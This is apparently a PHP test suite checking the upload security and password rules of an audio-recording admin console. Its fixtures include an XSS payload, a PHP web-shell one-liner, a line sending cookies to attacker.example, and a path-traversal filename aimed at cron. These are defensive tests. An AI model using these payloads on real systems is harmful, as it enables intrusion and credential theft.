<?php

declare(strict_types=1);

use App\Models\Recording;
use App\Stt\Support\WavFile;
use Filament\Auth\Pages\EditProfile;
use Filament\Facades\Filament;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Queue;
use Illuminate\Support\Facades\Storage;
use Illuminate\Testing\TestResponse;
use Livewire\Livewire;
use Tests\Feature\Security\Support\SecurityFixtures as Fx;

afterEach(fn () => Fx::cleanupDisks());

beforeEach(function () {
    Queue::fake();
    Fx::fakeDisk('recordings');
    Fx::fakeDisk('local');
    $admin = Fx::superAdmin();
    $admin->saveAppAuthenticationSecret('JBSWY3DPEHPK3PXP'); // enrolled, so the console audio route is reachable
    $this->actingAs($admin->fresh());
    Filament::setCurrentPanel('admin');
});

function secWav(int $dataBytes = 3200): string
{
    return WavFile::header(1, 16000, 16, $dataBytes).str_repeat("\0", $dataBytes);
}

/** @return list<string> every file currently stored on a disk */
function secFiles(string $disk): array
{
    return Storage::disk($disk)->allFiles();
}

/**
 * Sends a file through Library → Upload (the console's chunked upload routes) as the browser does: start, every chunk,
 * complete. Stops at the first refusal; returns that answer, or the complete answer.
 */
function secConsoleUpload(object $test, string $name, string $content): TestResponse
{
    $start = $test->postJson(route('admin.uploads.store'), ['name' => $name, 'size' => strlen($content), 'sha256' => hash('sha256', $content)]);
    if ($start->status() !== 201) {
        return $start;
    }
    for ($i = 0; $i < $start->json('total_chunks'); $i++) {
        $chunk = substr($content, $i * $start->json('chunk_size'), $start->json('chunk_size'));
        $sent = $test->call('POST', route('admin.uploads.chunk', [$start->json('recording_id'), $i]), [], [], [],
            ['CONTENT_TYPE' => 'application/octet-stream', 'HTTP_ACCEPT' => 'application/json', 'HTTP_UPLOAD_CHUNK_SHA256' => hash('sha256', $chunk)], $chunk);
        if ($sent->status() !== 200) {
            return $sent;
        }
    }

    return $test->postJson(route('admin.uploads.complete', $start->json('recording_id')));
}

it('turns a valid audio upload into an encrypted recording and leaves no plaintext behind', function () {
    secConsoleUpload($this, 'call.wav', secWav())->assertStatus(202);

    $recording = Recording::query()->firstOrFail();
    expect($recording->mime)->toBeIn(['audio/wav', 'audio/x-wav', 'audio/wave'])
        ->and($recording->isReady())->toBeTrue()
        ->and($recording->stored_path)->toEndWith('.elr');
    // The plaintext chunks are gone once the file is assembled and encrypted.
    expect(secFiles('recordings'))->toBe([$recording->stored_path]);
    expect(Storage::disk('recordings')->get($recording->stored_path))->not->toContain('RIFF');
});

it('refuses files that are not audio, whatever their extension claims', function (string $name, string $content) {
    $answer = secConsoleUpload($this, $name, $content);

    expect($answer->status())->toBe(422);
    expect(Recording::query()->count())->toBe(0);
    expect(secFiles('recordings'))->toBe([]);
})->with([
    'html named ogg' => ['evil.ogg', '<!doctype html><script>alert(document.domain)</script>'],
    'svg named wav' => ['evil.wav', '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"></svg>'],
    'php named mp3' => ['evil.mp3', '<?php system($_GET["c"]); ?>'],
    'windows executable named flac' => ['evil.flac', "MZ\x90\x00\x03\x00\x00\x00"],
    'javascript named webm' => ['evil.webm', 'fetch("//attacker.example/?"+document.cookie)'],
    'empty file' => ['empty.wav', ''],
]);

it('refuses an upload above the size cap before any of it is sent', function () {
    config(['echoledger.max_recording_bytes' => 4096]);

    secConsoleUpload($this, 'big.wav', secWav(8192))->assertStatus(422)->assertJsonValidationErrors('size');

    expect(Recording::query()->count())->toBe(0);
});

it('never lets the uploaded file name reach a stored path', function () {
    secConsoleUpload($this, '../../../../etc/cron.d/pwn.wav', secWav())->assertStatus(202);

    expect(secFiles('recordings'))->not->toBeEmpty();
    foreach (secFiles('recordings') as $path) {
        expect($path)->toMatch('~^files/\d{4}/\d{2}/[0-9a-z]{26}\.elr$~i');
    }
});

it('refuses a new profile password shorter than the twelve characters the CLI demands', function (string $password) {
    $admin = auth()->user();
    $storedHash = $admin->fresh()->password;

    Livewire::test(EditProfile::class)
        ->fillForm(['name' => $admin->name, 'email' => $admin->email, 'currentPassword' => 'password', 'password' => $password, 'passwordConfirmation' => $password])
        ->call('save')
        ->assertHasFormErrors(['password']);

    // Nothing was saved. (Comparing hashes also covers the "password" case, which equals the current password.)
    expect($admin->fresh()->password)->toBe($storedHash);
    if ($password !== 'password') {
        expect(Hash::check($password, $admin->fresh()->password))->toBeFalse();
    }
})->with(['12345678', 'password', 'abcdefgh', 'Aa1!aaaa', 'elevenchars']);

it('accepts a long profile password', function () {
    $admin = auth()->user();
    $password = 'a-sufficiently-long-passphrase-42';

    Livewire::test(EditProfile::class)
        ->fillForm(['name' => $admin->name, 'email' => $admin->email, 'currentPassword' => 'password', 'password' => $password, 'passwordConfirmation' => $password])
        ->call('save')
        ->assertHasNoFormErrors();

    expect(Hash::check($password, $admin->fresh()->password))->toBeTrue();
});

it('never serves a console upload back with an active document type such as text/html or image/svg+xml', function (string $name, string $content) {
    secConsoleUpload($this, $name, $content);
    $recording = Recording::query()->first();

    $type = $recording === null ? 'audio/none' : (string) $this->get('/admin-media/recordings/'.$recording->id)->headers->get('Content-Type');

    expect($type)->toStartWith('audio/');
})->with([
    'html named ogg' => ['evil.ogg', '<!doctype html><script>alert(document.domain)</script>'],
    'svg named wav' => ['evil.wav', '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"></svg>'],
]);
